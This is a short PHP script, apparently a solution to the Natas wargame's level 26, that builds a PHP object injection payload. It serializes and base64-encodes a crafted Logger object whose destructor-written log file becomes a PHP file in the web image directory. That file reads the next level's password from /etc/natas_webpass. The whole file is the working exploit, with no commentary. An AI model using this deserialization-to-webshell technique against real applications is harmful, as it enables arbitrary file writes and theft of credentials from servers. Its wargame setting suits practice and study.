<?php

	class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct(){
            // initialise variables
            $this->initMsg="Hello here is the dark hacker";
            $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27');?> \n";
            $this->logFile = "/var/www/natas/natas26/img/nooob.php";
        }                      
    }

$drawing = new Logger();

$lines = base64_encode(serialize($drawing));

print $lines."\n";

?>